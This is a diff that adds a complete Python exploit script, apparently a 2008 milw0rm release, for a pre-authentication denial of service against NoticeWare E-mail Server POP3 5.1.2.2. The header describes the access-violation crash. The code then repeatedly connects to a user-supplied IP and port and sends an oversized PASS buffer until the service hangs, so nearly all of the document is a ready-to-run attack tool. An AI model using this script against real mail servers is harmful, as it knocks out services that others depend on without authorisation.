@@ -1,0 +1,76 @@
+#!/usr/bin/python
+#################################################################################
+# Software: NoticeWare E-mail Sever (POP3) 5.1.2.2 Pre-Auth DoS                 #
+# Discovered and Coded by: Paul Hand aka rAWjAW                                 #
+# Blog: http://rawjaw-security.blogspot.com                                     #
+# E-mail: phand3754<at>gmail<dot>com                                            #
+#                                                                               #
+# Description:  NoticeWare E-mail Server has many odd querks about it           #
+# This DoS leverages the fact that the POP3 server can only handle              #
+# so many exceptions before you get an access violation at 0x00000008           #
+# which is given from an EDX+8 where EDX is 0x00000000.                         #
+# I've tried many things to get code execution and non are prevalent.           #
+# If you fuzz almost any of the commands for the POP3 server you will get it to #
+# crash.  Also, if you are authenticated and do "LIST 0.5" (numerous times) you #
+# will get the same access violation you do with this DoS.                      #
+#                                                                               #
+#Company Contact Date: 10-3-08 (But still no response)                          #
+#################################################################################
+import socket
+import sys
+from optparse import OptionParser
+
+usage = "%prog -T <Target_IP> -P <Target_Port>"
+parser = OptionParser(usage=usage)
+parser.add_option("-T", "--target_IP", type="string",
+	action="store", dest="IP", help="Target IP Address")
+parser.add_option("-P", "--target_Port", type="int",
+	action="store", dest="PORT", help="Target Port Address (usually 110)")
+(options, args) = parser.parse_args()
+IP=options.IP
+PORT=options.PORT
+if not (IP and PORT):
+	parser.print_help()
+	sys.exit(0)
+
+buffer='\x42'*1000
+
+print "########################################################"
+print "#                NoticeWare Email DoS                  #"
+print "#          Written by: Paul Hand aka rAWjAW            #"
+print "#                                                      #"
+print "# NOTE: The program does not seem to always crash at   #"
+print "# the same point for some reason so if the script      #"
+print "# hangs because of a \"faulty\" closed connection just   #"
+print "# just CTRL+C and that means the POP3 server has been  #"
+print "# successfully DoSed.  The program will still \"allow\"  #"
+print "# connections but they will just hang and cannot be    #"
+print "# used.                                                #"
+print "########################################################"
+try:
+	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	connect=s.connect((IP,PORT))
+	s.close()
+except socket.error, message:
+	print "Could not make initial connection. Quitting"
+	sys.exit(0)
+
+print "Connection to the target successful"
+print "Sending buffers..."
+
+x=1
+while x < 50:
+	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	connect=s.connect((IP,PORT))
+	s.recv(1024)
+	#You DO NOT need a vaild username
+	s.send('USER admin\r\n')
+	s.recv(1024)
+	s.send('PASS ' + buffer + '\r\n')
+	s.recv(1024)
+	s.close()
+	x=x+1
+	
+print "DoS Successful!"
+
+# milw0rm.com [2008-10-10]
